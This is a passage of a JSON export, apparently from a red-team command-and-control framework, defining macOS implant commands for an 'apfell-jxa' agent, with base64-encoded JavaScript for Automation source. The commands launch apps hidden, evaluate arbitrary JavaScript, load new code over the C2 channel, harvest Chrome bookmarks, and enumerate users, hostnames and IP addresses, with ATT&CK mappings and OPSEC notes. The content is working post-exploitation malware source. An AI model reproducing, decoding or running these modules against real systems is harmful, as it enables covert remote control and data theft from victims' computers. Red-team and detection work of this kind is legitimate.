GhQb3NpeEdJREF1dGhvcml0eShnaWQsIGRlZmF1bHRBdXRob3JpdHkpOwogICAgICAgICAgICBsZXQgcmVzdWx0cyA9IGdyb3VwLm1lbWJlcklkZW50aXRpZXMuanM7CiAgICAgICAgICAgIGxldCBudW1SZXN1bHRzID0gcmVzdWx0cy5sZW5ndGg7CiAgICAgICAgICAgIGZvcihsZXQgaSA9IDA7IGkgPCBudW1SZXN1bHRzOyBpKyspewogICAgICAgICAgICAgICAgbGV0IGlkT2JqID0gcmVzdWx0c1tpXTsKICAgICAgICAgICAgICAgIGxldCBpbmZvID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlBPU0lYTmFtZSI6IGlkT2JqLnBvc2l4TmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJQT1NJWElEIjogIGlkT2JqLnBvc2l4VUlELAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkxvY2FsQXV0aG9yaXR5IjogaWRPYmouYXV0aG9yaXR5LmxvY2FsaXplZE5hbWUuanMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRnVsbE5hbWUiOiBpZE9iai5mdWxsTmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFbWFpbHMiOiAgaWRPYmouZW1haWxBZGRyZXNzLmpzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImlzSGlkZGVuQWNjb3VudCI6IGlkT2JqLmlzSGlkZGVuLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkVuYWJsZWQiOiBpZE9iai5pc0VuYWJsZWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQWxpYXNlcyI6IE9iakMuZGVlcFVud3JhcChpZE9iai5hbGlhc2VzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJVVUlEIjogaWRPYmouVVVJRFN0cmluZy5qcwogICAgICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgYWxsX3VzZXJzLnB1c2goaW5mbyk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOkpTT04uc3RyaW5naWZ5KGFsbF91c2VycywgbnVsbCwgMiksICJjb21wbGV0ZWQiOiB0cnVlfTsKCX0KCWVsc2V7CgkgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJNZXRob2Qgbm90IGtub3duIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKCX0KfTsKQ09NTUFORF9FTkRTX0hFUkUK"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "launchapp {bundle name}",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This uses the Objective C bridge to launch the specified app asynchronously and 'hidden' (it'll still show up in the dock for now). An example of the bundle name is 'com.apple.itunes' for launching iTunes.",
          "cmd": "launchapp",
          "parameters": [
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "bundle"
            }
          ],
          "attack": [],
          "artifacts": [
            {
              "command_parameter": "null",
              "artifact": "Process Create",
              "artifact_string": "xpcproxy * (executed by launchd)",
              "replace_string": "*"
            },
            {
              "command_parameter": "null",
              "artifact": "Process Create",
              "artifact_string": "bundle launched (executed by user)",
              "replace_string": "*"
            }
          ],
          "files": [
            {
              "launchapp.js": "ZXhwb3J0cy5sYXVuY2hhcHAgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgIC8vdGhpcyBzaG91bGQgYmUgdGhlIGJ1bmRsZSBpZGVudGlmaWVyIGxpa2UgY29tLmFwcGxlLml0dW5lcyB0byBsYXVuY2gKICAgIC8vaXQgd2lsbCBsYXVuY2ggaGlkZGVuLCBhc3luY2hyb25vdXNseSwgYW5kIHdpbGwgYmUgJ2hpZGRlbicgKHN0aWxsIHNob3dzIHVwIGluIHRoZSBkb2NrIHRob3VnaCkKICAgIGxldCByZXNwb25zZSA9ICIiOwoJdHJ5ewoJCWxldCBjb21tYW5kX3BhcmFtcyA9IEpTT04ucGFyc2UocGFyYW1zKTsKCQlpZighY29tbWFuZF9wYXJhbXMuaGFzT3duUHJvcGVydHkoJ2J1bmRsZScpKXsgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiAibWlzc2luZyBidW5kbGUgaWRlbnRpZmllciIsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn19CgkJT2JqQy5pbXBvcnQoJ0FwcEtpdCcpOwoJCSQuTlNXb3Jrc3BhY2Uuc2hhcmVkV29ya3NwYWNlLmxhdW5jaEFwcFdpdGhCdW5kbGVJZGVudGlmaWVyT3B0aW9uc0FkZGl0aW9uYWxFdmVudFBhcmFtRGVzY3JpcHRvckxhdW5jaElkZW50aWZpZXIoCgkJICBjb21tYW5kX3BhcmFtc1snYnVuZGxlJ10sCgkJICAkLk5TV29ya3NwYWNlTGF1bmNoQXN5bmMgfCAkLk5TV29ya3NwYWNlTGF1bmNoQW5kSGlkZSB8ICQuTlNXb3Jrc3BhY2VMYXVuY2hXaXRob3V0QWRkaW5nVG9SZWNlbnRzLAoJCSAgJC5OU0FwcGxlRXZlbnREZXNjcmlwdG9yLm51bGxEZXNjcmlwdG9yLAoJCSAgbnVsbAoJCSk7CgkJcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJQcm9ncmFtIGxhdW5jaGVkIiwgImNvbXBsZXRlZCI6IHRydWV9OwoJfQoJY2F0Y2goZXJyb3IpewoJCXJldHVybiB7InVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwoJfQp9OwpDT01NQU5EX0VORFNfSEVSRQ=="
            }
          ],
          "transforms": [
            {
              "order": 1,
              "parameter": "bundle",
              "active": true,
              "description": "",
              "timestamp": "05\/07\/2020 07:01:49",
              "command": "launchapp",
              "command_id": 57,
              "payload_type": "apfell-jxa",
              "transform": "jsonSingleParameter",
              "parameter_type": "String"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "jscript {command}",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This runs the JavaScript command, {command}, and returns its output via an eval(). The output will get passed through ObjC.deepUnwrap to parse out basic data types from ObjectiveC and get strings back",
          "cmd": "jscript",
          "parameters": [
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "command"
            }
          ],
          "attack": [
            {
              "t_num": "T1064",
              "attack_name": "Scripting"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "jscript.js": "ZXhwb3J0cy5qc2NyaXB0ID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKCS8vc2ltcGx5IGV2YWwgYSBqYXZhc2NyaXB0IHN0cmluZyBhbmQgcmV0dXJuIHRoZSByZXNwb25zZQoJbGV0IHJlc3BvbnNlID0gIiI7Cgl0cnl7CgkJbGV0IGNvbW1hbmRfcGFyYW1zID0gSlNPTi5wYXJzZShwYXJhbXMpOwoJCWlmKCFjb21tYW5kX3BhcmFtcy5oYXNPd25Qcm9wZXJ0eSgiY29tbWFuZCIpKXsgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiAiTWlzc2luZyBjb21tYW5kIHBhcmFtZXRlciIsICJzdGF0dXMiOiAiZXJyb3IiLCAiY29tcGxldGVkIjogdHJ1ZX07fQoJCXJlc3BvbnNlID0gT2JqQy5kZWVwVW53cmFwKGV2YWwoY29tbWFuZF9wYXJhbXNbJ2NvbW1hbmQnXSkpOwoJfQoJY2F0Y2goZXJyb3IpewoJCXJldHVybiB7InVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwoJfQoJaWYocmVzcG9uc2UgPT09IHVuZGVmaW5lZCB8fCByZXNwb25zZSA9PT0gIiIpewoJICAgIHJlc3BvbnNlID0gIk5vIENvbW1hbmQgT3V0cHV0IjsKCX0KCWlmKHJlc3BvbnNlID09PSB0cnVlKXsKCSAgICByZXNwb25zZSA9ICJUcnVlIjsKCX0KCWlmKHJlc3BvbnNlID09PSBmYWxzZSl7CgkgICAgcmVzcG9uc2UgPSAiRmFsc2UiOwoJfQoJaWYodHlwZW9mKHJlc3BvbnNlKSAhPSAic3RyaW5nIil7CgkgICAgcmVzcG9uc2UgPSBTdHJpbmcocmVzcG9uc2UpOwoJfQoJcmV0dXJuIHsidXNlcl9vdXRwdXQiOnJlc3BvbnNlLCAiY29tcGxldGVkIjogdHJ1ZX07Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": [
            {
              "order": 1,
              "parameter": "command",
              "active": true,
              "description": "",
              "timestamp": "05\/07\/2020 07:01:49",
              "command": "jscript",
              "command_id": 58,
              "payload_type": "apfell-jxa",
              "transform": "jsonSingleParameter",
              "parameter_type": "String"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "load cmd1, cmd2, cmd3",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This loads a new function into memory via the C2 channel to be used by the operator. The code will be base64 encoded when requested. This will get transformed into load {\"cmds\": \"cmd1, cmd2, cmd3\", \"file_id\": #}",
          "cmd": "load",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1030",
              "attack_name": "Data Transfer Size Limits"
            },
            {
              "t_num": "T1129",
              "attack_name": "Execution through Module Load"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "load.js": "ZXhwb3J0cy5sb2FkID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKICAgIC8vYmFzZTY0IGRlY29kZSB0aGUgcGFyYW1zIGFuZCBwYXNzIGl0IHRvIHRoZSBkZWZhdWx0X2xvYWQgY29tbWFuZAogICAgLy8gIHBhcmFtcyBzaG91bGQgYmUgeyJjbWRzIjogWyJjbWRfbmFtZTEiLCAiY21kX25hbWUyIl0sICJmaWxlX2lkIjogI30KICAgIHRyeXsKICAgICAgICBsZXQgcGFyc2VkX3BhcmFtcyA9IEpTT04ucGFyc2UocGFyYW1zKTsKICAgICAgICBsZXQgY29kZSA9IEMyLnVwbG9hZCh0YXNrLCBwYXJzZWRfcGFyYW1zWydmaWxlX2lkJ10sICIiKTsKICAgICAgICBpZih0eXBlb2YgY29kZSA9PT0gInN0cmluZyIpewogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6U3RyaW5nKGNvZGUpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgICAgICAvL3NvbWV0aGluZyBmYWlsZWQsIHdlIHNob3VsZCBoYXZlIE5TRGF0YSB0eXBlIGJhY2sKICAgICAgICB9CiAgICAgICAgbGV0IG5ld19kaWN0ID0gZGVmYXVsdF9sb2FkKGJhc2U2NF9kZWNvZGUoY29kZSkpOwogICAgICAgIGNvbW1hbmRzX2RpY3QgPSBPYmplY3QuYXNzaWduKHt9LCBjb21tYW5kc19kaWN0LCBuZXdfZGljdCk7CiAgICAgICAgLy8gdXBkYXRlIHRoZSBjb25maWcgd2l0aCBvdXIgbmV3IGluZm9ybWF0aW9uCiAgICAgICAgQzIuY29tbWFuZHMgPSBPYmplY3Qua2V5cyhjb21tYW5kc19kaWN0KTsKICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ICJMb2FkZWQgIiArIHBhcnNlZF9wYXJhbXNbJ2NtZHMnXSwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgfQogICAgY2F0Y2goZXJyb3IpewogICAgICAgIC8vY29uc29sZS5sb2coImVycm9yZWQgaW4gbG9hZCBmdW5jdGlvbiIpOwogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgfQp9OwpDT01NQU5EX0VORFNfSEVSRQ=="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "chrome_bookmarks",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This uses JXA to list information about all of the bookmarks in Chrome. If Chrome is not currently running, this will launch Chrome (potential OPSEC issue) and might have a conflict with trying to access Chrome's bookmarks as Chrome is starting. It's recommended to not use this unless Chrome is already running. Use the list_apps function to check if Chrome is running.\nIn Mojave this will cause a popup the first time asking for permission for your process to access Chrome.",
          "cmd": "chrome_bookmarks",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1217",
              "attack_name": "Browser Bookmark Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "chrome_bookmarks.js": "ZXhwb3J0cy5jaHJvbWVfYm9va21hcmtzID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKCWxldCBhbGxfZGF0YSA9IFtdOwoJdHJ5ewoJCWxldCBjaCA9IEFwcGxpY2F0aW9uKCJHb29nbGUgQ2hyb21lIik7CgkJaWYoY2gucnVubmluZygpKXsKICAgICAgICAgICAgbGV0IGZvbGRlcnMgPSBjaC5ib29rbWFya0ZvbGRlcnM7CiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZm9sZGVycy5sZW5ndGg7IGkgKyspewogICAgICAgICAgICAgICAgbGV0IGZvbGRlciA9IGZvbGRlcnNbaV07CiAgICAgICAgICAgICAgICBsZXQgYm9va21hcmtzID0gZm9sZGVyLmJvb2ttYXJrSXRlbXM7CiAgICAgICAgICAgICAgICBhbGxfZGF0YS5wdXNoKCJGb2xkZXIgTmFtZTogIiArIGZvbGRlci50aXRsZSgpKTsKICAgICAgICAgICAgICAgIGZvciAobGV0IGogPSAwOyBqIDwgYm9va21hcmtzLmxlbmd0aDsgaisrKXsKICAgICAgICAgICAgICAgICAgICBsZXQgaW5mbyA9ICJUaXRsZTogIiArIGJvb2ttYXJrc1tqXS50aXRsZSgpICsKICAgICAgICAgICAgICAgICAgICAiXG5VUkw6ICIgKyBib29rbWFya3Nbal0udXJsKCkgKwogICAgICAgICAgICAgICAgICAgICJcbmluZGV4OiAiICsgYm9va21hcmtzW2pdLmluZGV4KCkgKwogICAgICAgICAgICAgICAgICAgICJcbkZvbGRlci9ib29rbWFyazogIiArIGkgKyAiLyIgKyBqOwogICAgICAgICAgICAgICAgICAgIGFsbF9kYXRhLnB1c2goaW5mbyk7IC8vcG9wdWxhdGUgb3VyIGFycmF5CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiAiQ2hyb21lIGlzIG5vdCBydW5uaW5nIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICB9Cgl9Y2F0Y2goZXJyb3IpewoJCWxldCBlcnIgPSBlcnJvci50b1N0cmluZygpOwoJCWlmKGVyciA9PT0gIkVycm9yOiBBbiBlcnJvciBvY2N1cnJlZC4iKXsKCQkgICAgZXJyICs9ICIgQXBmZWxsIHdhcyBkZW5pZWQgYWNjZXNzIHRvIEdvb2dsZSBDaHJvbWUgKGVpdGhlciBieSBwb3B1cCBvciBwcmlvciBkZW55KS4iOwoJCX0KCQlyZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwoJfQoJcmV0dXJuIHsidXNlcl9vdXRwdXQiOiBhbGxfZGF0YSwgImNvbXBsZXRlZCI6IHRydWV9Owp9OwpDT01NQU5EX0VORFNfSEVSRQ=="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "hostname",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Get the various hostnames associated with the host, including the NETBIOS name if the computer is domain joined",
          "cmd": "hostname",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "hostname.js": "ZXhwb3J0cy5ob3N0bmFtZSA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CglsZXQgb3V0cHV0ID0ge307CglvdXRwdXRbJ2xvY2FsaXplZCddID0gT2JqQy5kZWVwVW53cmFwKCQuTlNIb3N0LmN1cnJlbnRIb3N0LmxvY2FsaXplZE5hbWUpOwoJb3V0cHV0WyduYW1lcyddID0gT2JqQy5kZWVwVW53cmFwKCQuTlNIb3N0LmN1cnJlbnRIb3N0Lm5hbWVzKTsKCWxldCBmaWxlTWFuYWdlciA9ICQuTlNGaWxlTWFuYWdlci5kZWZhdWx0TWFuYWdlcjsKCWlmKGZpbGVNYW5hZ2VyLmZpbGVFeGlzdHNBdFBhdGgoIi9MaWJyYXJ5L1ByZWZlcmVuY2VzL1N5c3RlbUNvbmZpZ3VyYXRpb24vY29tLmFwcGxlLnNtYi5zZXJ2ZXIucGxpc3QiKSl7CgkJbGV0IGRpY3QgPSAkLk5TTXV0YWJsZURpY3Rpb25hcnkuYWxsb2MuaW5pdFdpdGhDb250ZW50c09mRmlsZSgiL0xpYnJhcnkvUHJlZmVyZW5jZXMvU3lzdGVtQ29uZmlndXJhdGlvbi9jb20uYXBwbGUuc21iLnNlcnZlci5wbGlzdCIpOwoJCWxldCBjb250ZW50cyA9IE9iakMuZGVlcFVud3JhcChkaWN0KTsKCQlvdXRwdXRbJ0xvY2FsIEtlcmJlcm9zIFJlYWxtJ10gPSBjb250ZW50c1snTG9jYWxLZXJiZXJvc1JlYWxtJ107CgkJb3V0cHV0WydORVRCSU9TIE5hbWUnXSA9IGNvbnRlbnRzWydOZXRCSU9TTmFtZSddOwoJCW91dHB1dFsnU2VydmVyIERlc2NyaXB0aW9uJ10gPSBjb250ZW50c1snU2VydmVyRGVzY3JpcHRpb24nXTsKCX0KCXJldHVybiB7InVzZXJfb3V0cHV0IjogSlNPTi5zdHJpbmdpZnkob3V0cHV0LCBudWxsLCAyKSwgImNvbXBsZXRlZCI6IHRydWV9Owp9OwpDT01NQU5EX0VORFNfSEVSRQogICAg"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "ifconfig",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "List out the current IP addresses",
          "cmd": "ifconfig",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "ifconfig.js": "ZXhwb3J0cy5pZmNvbmZpZyA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6IEpTT04uc3RyaW5naWZ5KE9iakMuZGVlcFVud3JhcCgkLk5TSG9zdC5jdXJyZW50SG9zdC5hZGRyZXNzZXMpLCBudWxsLCAyKSwgImNvbXBsZXRlZCI6IHRydWV9Owp9OwpDT01NQU5EX0VORFNfSEVSRQo="
            }
          ],
          "transforms": []
        }
      ]
    }
  ]
}
